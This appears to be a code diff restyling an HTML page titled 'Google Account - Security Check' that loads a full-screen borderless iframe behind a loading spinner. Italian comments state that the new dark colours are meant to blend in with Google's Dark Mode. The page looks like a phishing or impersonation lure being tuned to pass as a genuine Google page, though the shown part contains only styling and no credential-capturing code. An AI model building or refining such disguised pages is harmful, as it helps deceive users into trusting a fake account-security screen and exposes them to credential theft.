@@ -5,18 +5,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Google Account - Security Check</title>
     <style>
-        /* Reset totale per eliminare ogni pixel di margine */
+        /* Reset totale */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
+        /* Sfondo scuro per mimetizzarsi con la Dark Mode di Google */
         body, html { 
-            height: 100vh; 
-            width: 100vw; 
+            height: 100%; 
+            width: 100%; 
             overflow: hidden; 
-            background-color: #ffffff; 
+            background-color: #1a1b1e; 
             font-family: 'Roboto', Arial, sans-serif;
         }
 
@@ -31,9 +32,10 @@
             top: 0;
             left: 0;
             z-index: 1;
+            background-color: #1a1b1e;
         }
 
-        /* L'iframe ora è forzato a coprire tutto senza pietà */
+        /* Iframe a tutto schermo senza bordi */
         iframe { 
             position: absolute;
             top: 0;
@@ -43,11 +45,12 @@
             border: none; 
             display: block;
             z-index: 2;
-            background-color: #ffffff;
+            background-color: #1a1b1e;
         }
 
+        /* Spinner in stile Google Blue */
         .spinner {
-            border: 3px solid #f3f3f3;
+            border: 3px solid #333;
             border-top: 3px solid #4285F4;
             border-radius: 50%;
             width: 28px;
@@ -58,7 +61,7 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
         .loading-text {
-            color: #5f6368; 
+            color: #9aa0a6; 
             margin-top: 20px; 
             font-size: 14px;
         }
